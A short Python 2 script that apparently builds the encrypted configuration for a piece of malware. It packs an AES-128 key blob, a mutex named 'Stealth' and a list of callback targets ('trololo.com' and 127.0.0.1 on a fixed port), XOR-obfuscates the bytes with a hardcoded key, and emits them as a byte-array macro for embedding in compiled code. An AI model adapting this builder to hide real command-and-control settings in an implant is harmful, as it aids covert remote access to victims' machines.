from collections import namedtuple
import hashlib

class Builder():
    def __init__(self):
        self.r = []
    def addByte(self, b):
        self.r+= int(b&0xFF),
    def addWord(self, w):
        self.addByte(w>>0)
        self.addByte(w>>8)
    def addDword(self, d):
        self.addWord(d>>0)
        self.addWord(d>>16)
    def addArray(self, a):
        for b in a:
            try:
                self.addByte(b)
            except:
                self.addByte(ord(b))
    def addBlob(self, b):
        self.addByte(b[0])
        self.addByte(b[1])
        self.addWord(b[2])
        self.addDword(b[3])
        self.addDword(b[4])
        self.addArray(b[5])
    def addString(self, s):
        s+="\0"
        self.addArray(s)
    def addTargets(self, ts):
        for t in ts:
            w, s = t
            self.addWord(w)
            self.addString(s)
    def padd(self, n=8):
        if (len(self.r)%8 != 0):
            for i in range(len(self.r)%8):
                self.r += 0x00,
    def XorCrypt(self, pw = [172, 121, 207, 209, 247, 23, 114, 177]):
        for i in range(len(self.r)):
            self.r[i] = self.r[i]^pw[i%len(pw)]
    def result(self):
        return self.r
    def EMIT_BYTE_ARRAY(self):
        r = "EMIT_BYTE_ARRAY("
        for b in self.r:
            r+= "(0x%0X)"%(b)
        r+= ")"
        return r

PLAINTEXTKEYBLOB = 0x08
CUR_BLOB_VERSION = 0x02
CALG_AES_128     = 0x0000660E
PASSWORD         = "karcrack:1234"
MUTEX            = "Stealth"

aes128Blob = namedtuple("aes128Blob", "bType bVersion wReserved aiKeyAlg keySize keyData")

sha1 = hashlib.sha1()
sha1.update(PASSWORD)

blob = aes128Blob(bType    = PLAINTEXTKEYBLOB,
                  bVersion = CUR_BLOB_VERSION,
                  wReserved= 0x0000,
                  aiKeyAlg = CALG_AES_128,
                  keySize  = 0x00000010,
                  keyData  = [0x63, 0x08, 0x5B, 0x66, 0xDB, 0xD6, 0x33, 0x31, 0xF3, 0x80, 0xD9, 0x75, 0x59, 0xEC, 0x38, 0x04])#sha1.digest())

b = Builder()
b.addBlob(blob)
b.addString(MUTEX)
b.addTargets([[0x932B, "trololo.com"], [0x932B, "127.0.0.1"]])
b.addDword(0)
b.addDword(0)
b.padd()
b.XorCrypt()
print b.EMIT_BYTE_ARRAY()
